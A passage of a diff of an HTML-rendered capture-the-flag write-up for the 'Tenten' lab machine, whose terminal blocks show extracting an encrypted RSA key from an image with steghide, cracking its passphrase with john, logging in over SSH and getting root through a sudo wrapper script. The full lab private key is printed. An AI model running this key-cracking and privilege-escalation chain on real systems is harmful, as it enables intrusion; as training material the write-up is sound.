-</span></span><span style="display:flex;"><span>4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
-</span></span><span style="display:flex;"><span>2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
-</span></span><span style="display:flex;"><span>L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
-</span></span><span style="display:flex;"><span>VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
-</span></span><span style="display:flex;"><span>5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
-</span></span><span style="display:flex;"><span>Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
-</span></span><span style="display:flex;"><span>p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
-</span></span><span style="display:flex;"><span>yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
-</span></span><span style="display:flex;"><span>9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
-</span></span><span style="display:flex;"><span>vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
-</span></span><span style="display:flex;"><span>YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ sudo apt install steghide
+ctf@014202efa8c8:~/htb/tenten$ steghide extract -sf HackerAccessGranted.jpg
+Enter passphrase:
+wrote extracted data to <span style="color:#f1fa8c">&#34;id_rsa&#34;</span>.
+ctf@014202efa8c8:~/htb/tenten$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C
+
+/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
+tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
+1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
+K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
+SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
+WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
+VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
+J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
+AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
+2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
+6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
+pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
+tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
+KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
+4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
+2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
+L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
+VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
+5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
+Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
+p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
+yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
+9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
+vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
+YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
+-----END RSA PRIVATE KEY-----
+</code></pre></td></tr></table>
 </div>
 </div><p>let&rsquo;s try to ssh with this key
 We prepare the SSH key to be cracked with john thanks to <code>ssh2john.py</code></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ wget https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
-</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ python ssh2john.py id_rsa &gt; crack.txt
-</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ /opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt ~/htb/tenten/crack.txt
-</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
-</span></span><span style="display:flex;"><span>Loaded <span style="color:#bd93f9">1</span> password <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">(</span>SSH <span style="color:#ff79c6">[</span>RSA/DSA/EC/OPENSSH <span style="color:#ff79c6">(</span>SSH private keys<span style="color:#ff79c6">)</span> 32/64<span style="color:#ff79c6">])</span>
-</span></span><span style="display:flex;"><span>Cost <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>KDF/cipher <span style="color:#ff79c6">[</span><span style="color:#8be9fd;font-style:italic">0</span><span style="color:#ff79c6">=</span>MD5/AES <span style="color:#8be9fd;font-style:italic">1</span><span style="color:#ff79c6">=</span>MD5/3DES <span style="color:#8be9fd;font-style:italic">2</span><span style="color:#ff79c6">=</span>Bcrypt/AES<span style="color:#ff79c6">])</span> is <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">for</span> all loaded hashes
-</span></span><span style="display:flex;"><span>Cost <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">(</span>iteration count<span style="color:#ff79c6">)</span> is <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">for</span> all loaded hashes
-</span></span><span style="display:flex;"><span>Will run <span style="color:#bd93f9">4</span> OpenMP threads
-</span></span><span style="display:flex;"><span>Press <span style="color:#f1fa8c">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff79c6">for</span> status
-</span></span><span style="display:flex;"><span>superpassword    <span style="color:#ff79c6">(</span>id_rsa<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#ff79c6">(</span>2020-09-19 06:56<span style="color:#ff79c6">)</span> 4.000g/s 3120Kp/s 3120Kc/s 3120KC/s superrabbit..supermoose
-</span></span><span style="display:flex;"><span>Use the <span style="color:#f1fa8c">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
-</span></span><span style="display:flex;"><span>Session completed.
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ wget https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
+ctf@014202efa8c8:~/htb/tenten$ python ssh2john.py id_rsa &gt; crack.txt
+ctf@014202efa8c8:~/htb/tenten$ /opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt ~/htb/tenten/crack.txt
+Using default input encoding: UTF-8
+Loaded <span style="color:#bd93f9">1</span> password <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">(</span>SSH <span style="color:#ff79c6">[</span>RSA/DSA/EC/OPENSSH <span style="color:#ff79c6">(</span>SSH private keys<span style="color:#ff79c6">)</span> 32/64<span style="color:#ff79c6">])</span>
+Cost <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>KDF/cipher <span style="color:#ff79c6">[</span><span style="color:#8be9fd;font-style:italic">0</span><span style="color:#ff79c6">=</span>MD5/AES <span style="color:#8be9fd;font-style:italic">1</span><span style="color:#ff79c6">=</span>MD5/3DES <span style="color:#8be9fd;font-style:italic">2</span><span style="color:#ff79c6">=</span>Bcrypt/AES<span style="color:#ff79c6">])</span> is <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">for</span> all loaded hashes
+Cost <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">(</span>iteration count<span style="color:#ff79c6">)</span> is <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">for</span> all loaded hashes
+Will run <span style="color:#bd93f9">4</span> OpenMP threads
+Press <span style="color:#f1fa8c">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff79c6">for</span> status
+superpassword    <span style="color:#ff79c6">(</span>id_rsa<span style="color:#ff79c6">)</span>
+1g 0:00:00:00 DONE <span style="color:#ff79c6">(</span>2020-09-19 06:56<span style="color:#ff79c6">)</span> 4.000g/s 3120Kp/s 3120Kc/s 3120KC/s superrabbit..supermoose
+Use the <span style="color:#f1fa8c">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></td></tr></table>
 </div>
 </div><p>We can now attempt to login with the private key and passphrase</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ chmod <span style="color:#bd93f9">400</span> ./id_rsa
-</span></span><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/tenten$ ssh takis@10.10.10.10 -i ./id_rsa
-</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#ff79c6">for</span> key <span style="color:#f1fa8c">&#39;./id_rsa&#39;</span>:
-</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.2 LTS <span style="color:#ff79c6">(</span>GNU/Linux 4.4.0-62-generic x86_64<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
-</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
-</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#bd93f9">65</span> packages can be updated.
-</span></span><span style="display:flex;"><span><span style="color:#bd93f9">39</span> updates are security updates.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Last login: Fri May  <span style="color:#bd93f9">5</span> 23:05:36 <span style="color:#bd93f9">2017</span>
-</span></span><span style="display:flex;"><span>takis@tenten:~$ cat user.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/tenten$ chmod <span style="color:#bd93f9">400</span> ./id_rsa
+ctf@014202efa8c8:~/htb/tenten$ ssh takis@10.10.10.10 -i ./id_rsa
+Enter passphrase <span style="color:#ff79c6">for</span> key <span style="color:#f1fa8c">&#39;./id_rsa&#39;</span>:
+Welcome to Ubuntu 16.04.2 LTS <span style="color:#ff79c6">(</span>GNU/Linux 4.4.0-62-generic x86_64<span style="color:#ff79c6">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<span style="color:#bd93f9">65</span> packages can be updated.
+<span style="color:#bd93f9">39</span> updates are security updates.
+
+
+Last login: Fri May  <span style="color:#bd93f9">5</span> 23:05:36 <span style="color:#bd93f9">2017</span>
+takis@tenten:~$ cat user.txt
+<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="privilege-escalation">Privilege escalation</h1>
 <p>sudo privilege on a dangerous script</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>takis@tenten:~$ sudo -l
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> takis on tenten:
-</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User takis may run the following commands on tenten:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>ALL : ALL<span style="color:#ff79c6">)</span> ALL
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>ALL<span style="color:#ff79c6">)</span> NOPASSWD: /bin/fuckin
-</span></span><span style="display:flex;"><span>takis@tenten:~$ file /bin/fuckin
-</span></span><span style="display:flex;"><span>/bin/fuckin: Bourne-Again shell script, ASCII text executable
-</span></span><span style="display:flex;"><span>takis@tenten:~$ cat /bin/fuckin
-</span></span><span style="display:flex;"><span><span style="color:#6272a4">#!/bin/bash</span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#8be9fd;font-style:italic">$2</span> <span style="color:#8be9fd;font-style:italic">$3</span> <span style="color:#8be9fd;font-style:italic">$4</span>
-</span></span><span style="display:flex;"><span>takis@tenten:~$ sudo /bin/fuckin /bin/bash
-</span></span><span style="display:flex;"><span>root@tenten:~# ls ~
-</span></span><span style="display:flex;"><span>user.txt
-</span></span><span style="display:flex;"><span>root@tenten:~# cat /root/root.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">takis@tenten:~$ sudo -l
+Matching Defaults entries <span style="color:#ff79c6">for</span> takis on tenten:
+    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
+
+User takis may run the following commands on tenten:
+    <span style="color:#ff79c6">(</span>ALL : ALL<span style="color:#ff79c6">)</span> ALL
+    <span style="color:#ff79c6">(</span>ALL<span style="color:#ff79c6">)</span> NOPASSWD: /bin/fuckin
+takis@tenten:~$ file /bin/fuckin
+/bin/fuckin: Bourne-Again shell script, ASCII text executable
+takis@tenten:~$ cat /bin/fuckin
+<span style="color:#6272a4">#!/bin/bash</span>
+<span style="color:#8be9fd;font-style:italic">$1</span> <span style="color:#8be9fd;font-style:italic">$2</span> <span style="color:#8be9fd;font-style:italic">$3</span> <span style="color:#8be9fd;font-style:italic">$4</span>
+takis@tenten:~$ sudo /bin/fuckin /bin/bash
+root@tenten:~# ls ~
+user.txt
+root@tenten:~# cat /root/root.txt
+<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+</code></pre></td></tr></table>
 </div>
 </div>
       </div>
